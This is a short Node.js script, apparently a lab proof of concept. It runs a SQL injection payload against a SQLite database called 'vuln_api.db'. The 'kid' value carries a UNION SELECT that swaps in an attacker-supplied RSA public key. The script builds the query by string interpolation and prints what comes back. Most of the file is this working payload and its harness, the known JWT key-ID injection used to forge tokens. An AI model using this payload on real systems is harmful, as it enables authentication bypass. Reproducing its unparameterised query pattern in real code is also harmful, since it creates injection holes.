var sqlite3 = require('sqlite3');
let db = new sqlite3.Database('vuln_api.db');
let kid = `0 UNION SELECT \"-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=
-----END RSA PUBLIC KEY-----\"`
db.each(`SELECT pem FROM keys where id = ${kid}`, function(err, row) {
    console.log(`SELECT pem FROM keys where id = '${kid}'`)
    console.log(row);
  });
  //console.log(db.get("SELECT pem FROM keys where id=3"));